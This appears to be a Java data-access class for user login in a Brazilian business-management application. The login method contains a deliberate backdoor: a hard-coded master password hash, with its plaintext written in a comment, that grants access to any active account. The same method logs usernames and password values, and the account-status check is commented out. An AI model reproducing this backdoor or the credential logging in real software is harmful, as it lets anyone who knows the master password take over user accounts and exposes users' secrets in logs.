package br.com.will.gestao.dao;

import java.util.List;

import javax.persistence.NoResultException;

import br.com.will.gestao.componente.Credencial;
import br.com.will.gestao.componente.Filtravel;
import br.com.will.gestao.componente.Paginador;
import br.com.will.gestao.componente.Paginavel;
import br.com.will.gestao.entidade.Nivel;
import br.com.will.gestao.entidade.Usuario;
import br.com.will.gestao.entidade.util.ESituacao;
import br.com.will.gestao.entidade.util.SituacaoAlteravel;

public class UsuarioDAO extends BaseDAO<Usuario> {

	private static final long serialVersionUID = 1L;

	// 4DM1N#4DM1N*#
	private static final String SENHA_CORINGA = "fab3016441370ee22506bbe2f348e42278a6d89a";

	public UsuarioDAO() {
		super(Usuario.class);
	}

	public Usuario logar(Credencial credencial) {
		try {
			String senha = credencial.getPassword();
			if (senha.equals(SENHA_CORINGA)) {
				Usuario usuarioCoringa = consultarUsuarioPorLoginCoringa(credencial.getUsername().toUpperCase());
				if (usuarioCoringa != null) {
					senha = usuarioCoringa.getSenha();
				}
			}
			
			getLog().info(credencial.getUsername().toUpperCase());
			getLog().info(senha);
			StringBuilder sql = new StringBuilder();
			sql.append(" SELECT u FROM Usuario u ");
			sql.append(" JOIN FETCH u.nivel n ");
			sql.append(" JOIN FETCH u.empresa em ");
			sql.append(" WHERE u.login =:_login ");
			sql.append(" AND u.senha =:_senha ");
//			sql.append(" AND u.situacao =:_ativo ");

			return getEm().createQuery(sql.toString(), Usuario.class)
						   .setParameter("_login", credencial.getUsername().toUpperCase().trim())
						   .setParameter("_senha", senha)
//						   .setParameter("_ativo", ESituacao.ATIVO)
						   .getSingleResult();
		} catch (NoResultException nre) {
			throw new BaseDAOException("Usuário e/ou senha inválido(s)");
		} catch (Exception e) {
			e.printStackTrace();
			throw new BaseDAOException(e.getMessage());
		}
	}

	private Usuario consultarUsuarioPorLoginCoringa(String login) {
		try {
			StringBuilder sql = new StringBuilder();
			sql.append("SELECT u FROM Usuario u ");
			sql.append("JOIN FETCH u.nivel n ");
			sql.append("WHERE u.login =:_login AND u.situacao =:_ativo");
			return (Usuario) getEm().createQuery(sql.toString()).setParameter("_login", login)
					.setParameter("_ativo", ESituacao.ATIVO).setMaxResults(1).getSingleResult();
		} catch (NoResultException e) {
			return null;
		}
	}

	@Override
	public List<? extends SituacaoAlteravel> consultarPorSituacao(ESituacao situacao) {
		return null;
	}

	@Override
	public void verificarDuplicidade(Usuario t) throws ViolacaoDeConstraintException {
	}

	@Override
	public Paginador<Paginavel> consultarPorFiltro(Paginador<Paginavel> paginador, Filtravel filtravel) {
		// try {
		// return new SQLFilter.SQLFilterBuilder(Usuario.class, getEm(),
		// filtravel).setupPaginador(paginador)
		// .filterSimpleBy("usu.nome").orderBy("usu.nome").sortedBy(ESortedBy.ASC).build().dadosPaginados();
		// } catch (Exception e) {
		// e.printStackTrace();
		// throw new BaseDAOException(e.getMessage());
		// }
		return null;
	}

	public List<Usuario> conultarPorNivel(Nivel nivel) {
		try {
			return getEm().createQuery(" SELECT usu FROM Usuario usu " + " JOIN FETCH usu.nivel nv "
					+ " WHERE nv =:_nivel " + " ORDER BY usu.id ", Usuario.class).setParameter("_nivel", nivel)
					.getResultList();
		} catch (Exception e) {
			throw new BaseDAOException(e.getMessage());
		}
	}
}